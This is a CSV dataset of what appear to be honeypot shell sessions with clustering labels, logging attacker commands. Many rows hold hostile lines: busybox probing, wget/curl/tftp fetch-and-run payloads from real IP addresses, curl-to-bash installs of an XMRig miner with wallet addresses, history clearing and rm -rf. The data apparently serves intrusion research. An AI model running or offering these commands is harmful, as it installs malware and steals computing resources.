session,PCKmeans_exp_result,Unnamed: 0,duration,command_freq,input
5d74ed3c4e14,1,946,181.0146028995514,19,cat /bin/ls|more
5d74ed3c4e14,1,947,181.0146028995514,19,cat /bin/ls | more
ef6fd1fdddf6,2,948,6.266026020050049,13,enable
ef6fd1fdddf6,2,949,6.266026020050049,13,system
ef6fd1fdddf6,2,950,6.266026020050049,13,system
ef6fd1fdddf6,2,951,6.266026020050049,13,shell
ef6fd1fdddf6,2,952,6.266026020050049,13,shell
ef6fd1fdddf6,2,953,6.266026020050049,13,sh
ef6fd1fdddf6,2,954,6.266026020050049,13,cat /proc/mounts; /bin/busybox LJLNW
ef6fd1fdddf6,2,955,6.266026020050049,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox LJLNW
ef6fd1fdddf6,2,956,6.266026020050049,13,tftp; wget; /bin/busybox LJLNW
ef6fd1fdddf6,2,957,6.266026020050049,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
ef6fd1fdddf6,2,958,6.266026020050049,13,while read i
ef6fd1fdddf6,2,959,6.266026020050049,13,/bin/busybox LJLNW
ef6fd1fdddf6,2,960,6.266026020050049,13,rm .s; exit
0c199685ea96,1,961,2.032302856445312,1,cat /proc/uptime
b1d6fd3a3db9,2,962,4.265688419342041,13,enable
b1d6fd3a3db9,2,963,4.265688419342041,13,system
b1d6fd3a3db9,2,964,4.265688419342041,13,system
b1d6fd3a3db9,2,965,4.265688419342041,13,shell
b1d6fd3a3db9,2,966,4.265688419342041,13,shell
b1d6fd3a3db9,2,967,4.265688419342041,13,sh
b1d6fd3a3db9,2,968,4.265688419342041,13,cat /proc/mounts; /bin/busybox ENBYC
b1d6fd3a3db9,2,969,4.265688419342041,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox ENBYC
b1d6fd3a3db9,2,970,4.265688419342041,13,tftp; wget; /bin/busybox ENBYC
b1d6fd3a3db9,2,971,4.265688419342041,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
b1d6fd3a3db9,2,972,4.265688419342041,13,while read i
b1d6fd3a3db9,2,973,4.265688419342041,13,/bin/busybox ENBYC
b1d6fd3a3db9,2,974,4.265688419342041,13,rm .s; exit
952631ec76e4,0,975,0.6126441955566401,2,cd /tmp; curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA; wget http://179.43.175.170/putkite/quickr1n.sh; curl -O http://179.43.175.170/putkite/quickr1n.sh; chmod 777 *; sh quickr1n.sh; echo storytime
952631ec76e4,0,976,0.6126441955566401,2,curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA
e5fe0c6544ef,0,977,4.2956702709198,1,#!/bin/sh; PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; wget http://101.51.121.206/scripts/23s; curl -O http://101.51.121.206/scripts/23s; chmod +x 23s; ./23s; wget http://101.51.121.206/scripts/23; curl -O http://101.51.121.206/scripts/23; chmod +x 23; ./23; rm -rf 23.sh; 
ab904e5d16be,2,978,4.490142345428467,13,enable
ab904e5d16be,2,979,4.490142345428467,13,system
ab904e5d16be,2,980,4.490142345428467,13,system
ab904e5d16be,2,981,4.490142345428467,13,shell
ab904e5d16be,2,982,4.490142345428467,13,shell
ab904e5d16be,2,983,4.490142345428467,13,sh
ab904e5d16be,2,984,4.490142345428467,13,cat /proc/mounts; /bin/busybox HAOTQ
ab904e5d16be,2,985,4.490142345428467,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox HAOTQ
ab904e5d16be,2,986,4.490142345428467,13,tftp; wget; /bin/busybox HAOTQ
ab904e5d16be,2,987,4.490142345428467,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
ab904e5d16be,2,988,4.490142345428467,13,while read i
ab904e5d16be,2,989,4.490142345428467,13,/bin/busybox HAOTQ
ab904e5d16be,2,990,4.490142345428467,13,rm .s; exit
760d400e7a3d,0,991,7.913757562637329,19,start
760d400e7a3d,0,992,7.913757562637329,19,start
760d400e7a3d,0,993,7.913757562637329,19,enable
760d400e7a3d,0,994,7.913757562637329,19,config terminal
760d400e7a3d,0,995,7.913757562637329,19,config terminal
760d400e7a3d,0,996,7.913757562637329,19,system
760d400e7a3d,0,997,7.913757562637329,19,system
760d400e7a3d,0,998,7.913757562637329,19,linuxshell
760d400e7a3d,0,999,7.913757562637329,19,linuxshell
760d400e7a3d,0,1000,7.913757562637329,19,su
760d400e7a3d,0,1001,7.913757562637329,19,shell
760d400e7a3d,0,1002,7.913757562637329,19,shell
760d400e7a3d,0,1003,7.913757562637329,19,sh
760d400e7a3d,0,1004,7.913757562637329,19,cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /;/bin/busybox echo -ne '\x45\x4c\x46'
760d400e7a3d,0,1005,7.913757562637329,19,echo -ne \x45\x4c\x46
760d400e7a3d,0,1006,7.913757562637329,19,/bin/busybox wget;/bin/busybox echo -ne '\x45\x4c\x46'
760d400e7a3d,0,1007,7.913757562637329,19,wget
760d400e7a3d,0,1008,7.913757562637329,19,echo -ne \x45\x4c\x46
760d400e7a3d,0,1009,7.913757562637329,19,cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /; rm -rf i; wget http://192.168.1.1:8088/i; curl -O http://192.168.1.1:8088/i; /bin/busybox wget http://192.168.1.1:8088/i; chmod 777 i || (cp /bin/ls ii;cat i>ii;rm i;cp ii i;rm ii); ./i; echo -e '\x63\x6F\x6E\x6E\x65\x63\x74\x65\x64'
ea384520fda2,1,1010,9.88868761062622,2,curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 47yfXMczghs86YWRp1GQ8rR3mKJMGFnCbcPcbGq484JPfWyuYv5q7rHBzkC1LWtbXnLrKCyqDhqqj6DW4MBp92qtTxcwHk6
ea384520fda2,1,1011,9.88868761062622,2,curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 47yfXMczghs86YWRp1GQ8rR3mKJMGFnCbcPcbGq484JPfWyuYv5q7rHBzkC1LWtbXnLrKCyqDhqqj6DW4MBp92qtTxcwHk6
a7179268d474,1,1012,107.11632347106934,9,/ip cloud print
a7179268d474,1,1013,107.11632347106934,9,/ip cloud print
a7179268d474,1,1014,107.11632347106934,9,ifconfig
a7179268d474,1,1015,107.11632347106934,9,uname -a
a7179268d474,1,1016,107.11632347106934,9,cat /proc/cpuinfo
a7179268d474,1,1017,107.11632347106934,9,ps | grep '[Mm]iner'
a7179268d474,1,1018,107.11632347106934,9,ps -ef | grep '[Mm]iner'
a7179268d474,1,1019,107.11632347106934,9,ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
a7179268d474,1,1020,107.11632347106934,9,echo Hi | cat -n
5322947029ea,0,1021,8.718995332717896,2,curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 47yfXMczghs86YWRp1GQ8rR3mKJMGFnCbcPcbGq484JPfWyuYv5q7rHBzkC1LWtbXnLrKCyqDhqqj6DW4MBp92qtTxcwHk6
5322947029ea,0,1022,8.718995332717896,2,curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 47yfXMczghs86YWRp1GQ8rR3mKJMGFnCbcPcbGq484JPfWyuYv5q7rHBzkC1LWtbXnLrKCyqDhqqj6DW4MBp92qtTxcwHk6
c888ec6c124f,0,1023,61.89022707939148,1,cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
9bc0f24ddf74,2,1024,4.97085428237915,13,enable
9bc0f24ddf74,2,1025,4.97085428237915,13,system
9bc0f24ddf74,2,1026,4.97085428237915,13,system
9bc0f24ddf74,2,1027,4.97085428237915,13,shell
9bc0f24ddf74,2,1028,4.97085428237915,13,shell
9bc0f24ddf74,2,1029,4.97085428237915,13,sh
9bc0f24ddf74,2,1030,4.97085428237915,13,cat /proc/mounts; /bin/busybox AJBRM
9bc0f24ddf74,2,1031,4.97085428237915,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox AJBRM
9bc0f24ddf74,2,1032,4.97085428237915,13,tftp; wget; /bin/busybox AJBRM
9bc0f24ddf74,2,1033,4.97085428237915,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
9bc0f24ddf74,2,1034,4.97085428237915,13,while read i
9bc0f24ddf74,2,1035,4.97085428237915,13,/bin/busybox AJBRM
9bc0f24ddf74,2,1036,4.97085428237915,13,rm .s; exit
f718130ece9d,1,1037,94.3597183227539,9,/ip cloud print
f718130ece9d,1,1038,94.3597183227539,9,/ip cloud print
f718130ece9d,1,1039,94.3597183227539,9,ifconfig
f718130ece9d,1,1040,94.3597183227539,9,uname -a
f718130ece9d,1,1041,94.3597183227539,9,cat /proc/cpuinfo
f718130ece9d,1,1042,94.3597183227539,9,ps | grep '[Mm]iner'
f718130ece9d,1,1043,94.3597183227539,9,ps -ef | grep '[Mm]iner'
f718130ece9d,1,1044,94.3597183227539,9,ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
f718130ece9d,1,1045,94.3597183227539,9,echo Hi | cat -n
a0fd5aaf3f9d,2,1046,3.10685133934021,13,enable
a0fd5aaf3f9d,2,1047,3.10685133934021,13,system
a0fd5aaf3f9d,2,1048,3.10685133934021,13,system
a0fd5aaf3f9d,2,1049,3.10685133934021,13,shell
a0fd5aaf3f9d,2,1050,3.10685133934021,13,shell
a0fd5aaf3f9d,2,1051,3.10685133934021,13,sh
a0fd5aaf3f9d,2,1052,3.10685133934021,13,cat /proc/mounts; /bin/busybox PBHTG
a0fd5aaf3f9d,2,1053,3.10685133934021,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox PBHTG
a0fd5aaf3f9d,2,1054,3.10685133934021,13,tftp; wget; /bin/busybox PBHTG
a0fd5aaf3f9d,2,1055,3.10685133934021,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
a0fd5aaf3f9d,2,1056,3.10685133934021,13,while read i
a0fd5aaf3f9d,2,1057,3.10685133934021,13,/bin/busybox PBHTG
a0fd5aaf3f9d,2,1058,3.10685133934021,13,rm .s; exit
147728018e2f,2,1059,4.079804420471191,13,enable
147728018e2f,2,1060,4.079804420471191,13,system
147728018e2f,2,1061,4.079804420471191,13,system
147728018e2f,2,1062,4.079804420471191,13,shell
147728018e2f,2,1063,4.079804420471191,13,shell
147728018e2f,2,1064,4.079804420471191,13,sh
147728018e2f,2,1065,4.079804420471191,13,cat /proc/mounts; /bin/busybox ZIKMY
147728018e2f,2,1066,4.079804420471191,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox ZIKMY
147728018e2f,2,1067,4.079804420471191,13,tftp; wget; /bin/busybox ZIKMY
147728018e2f,2,1068,4.079804420471191,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
147728018e2f,2,1069,4.079804420471191,13,while read i
147728018e2f,2,1070,4.079804420471191,13,/bin/busybox ZIKMY
147728018e2f,2,1071,4.079804420471191,13,rm .s; exit
a6a860979060,2,1072,3.480592727661133,12,enable
a6a860979060,2,1073,3.480592727661133,12,system
a6a860979060,2,1074,3.480592727661133,12,system
a6a860979060,2,1075,3.480592727661133,12,shell
a6a860979060,2,1076,3.480592727661133,12,shell
a6a860979060,2,1077,3.480592727661133,12,sh
a6a860979060,2,1078,3.480592727661133,12,cat /proc/mounts; /bin/busybox PEAOU
a6a860979060,2,1079,3.480592727661133,12,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox PEAOU
a6a860979060,2,1080,3.480592727661133,12,tftp; wget; /bin/busybox PEAOU
a6a860979060,2,1081,3.480592727661133,12,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
a6a860979060,2,1082,3.480592727661133,12,while read i
a6a860979060,2,1083,3.480592727661133,12,/bin/busybox PEAOU
0fb9e585e05d,1,1084,0.351068019866943,1,nproc;uname -a
18f683fe5abe,2,1085,4.53922700881958,13,enable
18f683fe5abe,2,1086,4.53922700881958,13,system
18f683fe5abe,2,1087,4.53922700881958,13,system
18f683fe5abe,2,1088,4.53922700881958,13,shell
18f683fe5abe,2,1089,4.53922700881958,13,shell
18f683fe5abe,2,1090,4.53922700881958,13,sh
18f683fe5abe,2,1091,4.53922700881958,13,cat /proc/mounts; /bin/busybox BIGJV
18f683fe5abe,2,1092,4.53922700881958,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox BIGJV
18f683fe5abe,2,1093,4.53922700881958,13,tftp; wget; /bin/busybox BIGJV
18f683fe5abe,2,1094,4.53922700881958,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
18f683fe5abe,2,1095,4.53922700881958,13,while read i
18f683fe5abe,2,1096,4.53922700881958,13,/bin/busybox BIGJV
18f683fe5abe,2,1097,4.53922700881958,13,rm .s; exit
443c95f9bc9a,0,1098,60.39293432235718,1,cd /tmp/; wget 179.43.175.83/x86_64; chmod 777 x86_64; ./x86_64 x86xhed
accc7454e062,2,1099,0.6267852783203121,13,enable
accc7454e062,2,1100,0.6267852783203121,13,system
accc7454e062,2,1101,0.6267852783203121,13,system
accc7454e062,2,1102,0.6267852783203121,13,shell
accc7454e062,2,1103,0.6267852783203121,13,shell
accc7454e062,2,1104,0.6267852783203121,13,sh
accc7454e062,2,1105,0.6267852783203121,13,cat /proc/mounts; /bin/busybox UVBBX
accc7454e062,2,1106,0.6267852783203121,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox UVBBX
accc7454e062,2,1107,0.6267852783203121,13,tftp; wget; /bin/busybox UVBBX
accc7454e062,2,1108,0.6267852783203121,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
accc7454e062,2,1109,0.6267852783203121,13,while read i
accc7454e062,2,1110,0.6267852783203121,13,/bin/busybox UVBBX
accc7454e062,2,1111,0.6267852783203121,13,rm .s; exit
3d8f4d86132d,2,1112,3.307204723358154,13,enable
3d8f4d86132d,2,1113,3.307204723358154,13,system
3d8f4d86132d,2,1114,3.307204723358154,13,system
3d8f4d86132d,2,1115,3.307204723358154,13,shell
3d8f4d86132d,2,1116,3.307204723358154,13,shell
3d8f4d86132d,2,1117,3.307204723358154,13,sh
3d8f4d86132d,2,1118,3.307204723358154,13,cat /proc/mounts; /bin/busybox TIVBU
3d8f4d86132d,2,1119,3.307204723358154,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox TIVBU
3d8f4d86132d,2,1120,3.307204723358154,13,tftp; wget; /bin/busybox TIVBU
3d8f4d86132d,2,1121,3.307204723358154,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
3d8f4d86132d,2,1122,3.307204723358154,13,while read i
3d8f4d86132d,2,1123,3.307204723358154,13,/bin/busybox TIVBU
3d8f4d86132d,2,1124,3.307204723358154,13,rm .s; exit
4aff162823d5,0,1125,3.609194278717041,19,start
4aff162823d5,0,1126,3.609194278717041,19,start
4aff162823d5,0,1127,3.609194278717041,19,enable
4aff162823d5,0,1128,3.609194278717041,19,config terminal
4aff162823d5,0,1129,3.609194278717041,19,config terminal
4aff162823d5,0,1130,3.609194278717041,19,system
4aff162823d5,0,1131,3.609194278717041,19,system
4aff162823d5,0,1132,3.609194278717041,19,linuxshell
4aff162823d5,0,1133,3.609194278717041,19,linuxshell
4aff162823d5,0,1134,3.609194278717041,19,su
4aff162823d5,0,1135,3.609194278717041,19,shell
4aff162823d5,0,1136,3.609194278717041,19,shell
4aff162823d5,0,1137,3.609194278717041,19,sh
4aff162823d5,0,1138,3.609194278717041,19,cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /;/bin/busybox echo -ne '\x45\x4c\x46'
4aff162823d5,0,1139,3.609194278717041,19,echo -ne \x45\x4c\x46
4aff162823d5,0,1140,3.609194278717041,19,/bin/busybox wget;/bin/busybox echo -ne '\x45\x4c\x46'
4aff162823d5,0,1141,3.609194278717041,19,wget
4aff162823d5,0,1142,3.609194278717041,19,echo -ne \x45\x4c\x46
4aff162823d5,0,1143,3.609194278717041,19,cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /; rm -rf i; wget http://192.168.1.1:8088/i; curl -O http://192.168.1.1:8088/i; /bin/busybox wget http://192.168.1.1:8088/i; chmod 777 i || (cp /bin/ls ii;cat i>ii;rm i;cp ii i;rm ii); ./i; echo -e '\x63\x6F\x6E\x6E\x65\x63\x74\x65\x64'
268d97f81b2c,2,1144,4.465349197387695,13,enable
268d97f81b2c,2,1145,4.465349197387695,13,system
268d97f81b2c,2,1146,4.465349197387695,13,system
268d97f81b2c,2,1147,4.465349197387695,13,shell
268d97f81b2c,2,1148,4.465349197387695,13,shell
268d97f81b2c,2,1149,4.465349197387695,13,sh
268d97f81b2c,2,1150,4.465349197387695,13,cat /proc/mounts; /bin/busybox HFPHW
268d97f81b2c,2,1151,4.465349197387695,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox HFPHW
268d97f81b2c,2,1152,4.465349197387695,13,tftp; wget; /bin/busybox HFPHW
268d97f81b2c,2,1153,4.465349197387695,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
268d97f81b2c,2,1154,4.465349197387695,13,while read i
268d97f81b2c,2,1155,4.465349197387695,13,/bin/busybox HFPHW
268d97f81b2c,2,1156,4.465349197387695,13,rm .s; exit
ab3f3d09e47c,1,1157,190.4951496124268,9,/ip cloud print
ab3f3d09e47c,1,1158,190.4951496124268,9,/ip cloud print
ab3f3d09e47c,1,1159,190.4951496124268,9,ifconfig
ab3f3d09e47c,1,1160,190.4951496124268,9,uname -a
ab3f3d09e47c,1,1161,190.4951496124268,9,cat /proc/cpuinfo
ab3f3d09e47c,1,1162,190.4951496124268,9,ps | grep '[Mm]iner'
ab3f3d09e47c,1,1163,190.4951496124268,9,ps -ef | grep '[Mm]iner'
ab3f3d09e47c,1,1164,190.4951496124268,9,ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
ab3f3d09e47c,1,1165,190.4951496124268,9,echo Hi | cat -n
53c3361177b5,1,1168,0.150722742080688,1,echo ok
8090ceaff1f8,1,1169,129.06823563575745,1,uname -a;nproc;history -c
e7c779c4daea,2,1170,3.859371662139892,13,enable
e7c779c4daea,2,1171,3.859371662139892,13,system
e7c779c4daea,2,1172,3.859371662139892,13,system
e7c779c4daea,2,1173,3.859371662139892,13,shell
e7c779c4daea,2,1174,3.859371662139892,13,shell
e7c779c4daea,2,1175,3.859371662139892,13,sh
e7c779c4daea,2,1176,3.859371662139892,13,cat /proc/mounts; /bin/busybox WCHNO
e7c779c4daea,2,1177,3.859371662139892,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox WCHNO
e7c779c4daea,2,1178,3.859371662139892,13,tftp; wget; /bin/busybox WCHNO
e7c779c4daea,2,1179,3.859371662139892,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
e7c779c4daea,2,1180,3.859371662139892,13,while read i
e7c779c4daea,2,1181,3.859371662139892,13,/bin/busybox WCHNO
e7c779c4daea,2,1182,3.859371662139892,13,rm .s; exit
c1f83069fa9b,2,1183,6.0199134349823,13,enable
c1f83069fa9b,2,1184,6.0199134349823,13,system
c1f83069fa9b,2,1185,6.0199134349823,13,system
c1f83069fa9b,2,1186,6.0199134349823,13,shell
c1f83069fa9b,2,1187,6.0199134349823,13,shell
c1f83069fa9b,2,1188,6.0199134349823,13,sh
c1f83069fa9b,2,1189,6.0199134349823,13,cat /proc/mounts; /bin/busybox TQFXJ
c1f83069fa9b,2,1190,6.0199134349823,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox TQFXJ
c1f83069fa9b,2,1191,6.0199134349823,13,tftp; wget; /bin/busybox TQFXJ
c1f83069fa9b,2,1192,6.0199134349823,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
c1f83069fa9b,2,1193,6.0199134349823,13,while read i
c1f83069fa9b,2,1194,6.0199134349823,13,/bin/busybox TQFXJ
c1f83069fa9b,2,1195,6.0199134349823,13,rm .s; exit
8d7cb830cb55,1,1196,0.256908655166626,1,echo ok
87e686e8d93e,1,1197,0.202330350875854,1,echo ok
61d0c0534c36,1,1198,0.156226873397827,1,echo ok
61956a64cefc,1,1199,0.231451988220214,1,echo ok
05581482c10e,1,1200,0.5246894359588621,1,scp -t /tmp/T8nlEKe7
c4b0e1d4783f,1,1201,0.5532121658325191,1,scp -t /tmp/T8nlEKe7
52bb851ee480,0,1202,0.499987363815307,3,cd /tmp && chmod +x T8nlEKe7 && bash -c ./T8nlEKe7
52bb851ee480,0,1203,0.499987363815307,3,./T8nlEKe7
52bb851ee480,0,1204,0.499987363815307,3,./T8nlEKe7
128ecbea56d8,0,1205,0.492727994918823,3,cd /tmp && chmod +x T8nlEKe7 && bash -c ./T8nlEKe7
128ecbea56d8,0,1206,0.492727994918823,3,./T8nlEKe7
128ecbea56d8,0,1207,0.492727994918823,3,./T8nlEKe7
18680af063d7,1,1208,0.229528427124023,1,echo ok
c86910437a0c,1,1209,0.5643789768218991,1,nproc;uname -a
494b19c12a5b,1,1210,0.253534793853759,1,echo ok
2bac30288b22,2,1211,14.378341913223268,13,enable
2bac30288b22,2,1212,14.378341913223268,13,system
2bac30288b22,2,1213,14.378341913223268,13,system
2bac30288b22,2,1214,14.378341913223268,13,shell
2bac30288b22,2,1215,14.378341913223268,13,shell
2bac30288b22,2,1216,14.378341913223268,13,sh
2bac30288b22,2,1217,14.378341913223268,13,cat /proc/mounts; /bin/busybox MWIFM
2bac30288b22,2,1218,14.378341913223268,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox MWIFM
2bac30288b22,2,1219,14.378341913223268,13,tftp; wget; /bin/busybox MWIFM
2bac30288b22,2,1220,14.378341913223268,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
2bac30288b22,2,1221,14.378341913223268,13,while read i
2bac30288b22,2,1222,14.378341913223268,13,/bin/busybox MWIFM
2bac30288b22,2,1223,14.378341913223268,13,rm .s; exit
312b2d3856f9,1,1224,0.20635962486267,1,echo ok
1c339f05e11b,1,1225,0.139369487762451,1,echo ok
cbede762ed90,1,1226,0.316829919815063,1,nproc;uname -a
43686d60e662,1,1229,0.904664516448974,1,nproc;uname -a
63e8e481540e,1,1230,0.177230358123779,1,echo ok
7336c96cd5ac,1,1231,0.271963834762573,1,echo ok
ca04a424c49f,1,1232,0.161009550094604,1,echo ok
a893021ca3ce,1,1233,0.277474403381347,1,echo ok
a4469c4cc8a9,1,1234,0.918789625167846,1,nproc;uname -a
4dda8ddfae4e,2,1235,2.648022890090942,13,enable
4dda8ddfae4e,2,1236,2.648022890090942,13,system
4dda8ddfae4e,2,1237,2.648022890090942,13,system
4dda8ddfae4e,2,1238,2.648022890090942,13,shell
4dda8ddfae4e,2,1239,2.648022890090942,13,shell
4dda8ddfae4e,2,1240,2.648022890090942,13,sh
4dda8ddfae4e,2,1241,2.648022890090942,13,cat /proc/mounts; /bin/busybox VKKYD
4dda8ddfae4e,2,1242,2.648022890090942,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox VKKYD
4dda8ddfae4e,2,1243,2.648022890090942,13,tftp; wget; /bin/busybox VKKYD
4dda8ddfae4e,2,1244,2.648022890090942,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
4dda8ddfae4e,2,1245,2.648022890090942,13,while read i
4dda8ddfae4e,2,1246,2.648022890090942,13,/bin/busybox VKKYD
4dda8ddfae4e,2,1247,2.648022890090942,13,rm .s; exit
8a2269088f9e,1,1248,0.307116508483886,1,nproc;uname -a
86ff6b1d1497,2,1249,3.679772853851318,13,enable
86ff6b1d1497,2,1250,3.679772853851318,13,system
86ff6b1d1497,2,1251,3.679772853851318,13,system
86ff6b1d1497,2,1252,3.679772853851318,13,shell
86ff6b1d1497,2,1253,3.679772853851318,13,shell
86ff6b1d1497,2,1254,3.679772853851318,13,sh
86ff6b1d1497,2,1255,3.679772853851318,13,cat /proc/mounts; /bin/busybox RXFYB
86ff6b1d1497,2,1256,3.679772853851318,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox RXFYB
86ff6b1d1497,2,1257,3.679772853851318,13,tftp; wget; /bin/busybox RXFYB
86ff6b1d1497,2,1258,3.679772853851318,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
86ff6b1d1497,2,1259,3.679772853851318,13,while read i
86ff6b1d1497,2,1260,3.679772853851318,13,/bin/busybox RXFYB
86ff6b1d1497,2,1261,3.679772853851318,13,rm .s; exit
88c57bfaaa98,1,1262,0.908699035644531,1,nproc;uname -a
666e935a2bec,1,1263,1.8667893409729,1,cat /proc/uptime
c4f944fd2784,0,1264,0.565829038619995,2,cd /tmp; curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA; wget http://179.43.175.170/putkite/quickr1n.sh; curl -O http://179.43.175.170/putkite/quickr1n.sh; chmod 777 *; sh quickr1n.sh; echo storytime
c4f944fd2784,0,1265,0.565829038619995,2,curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA
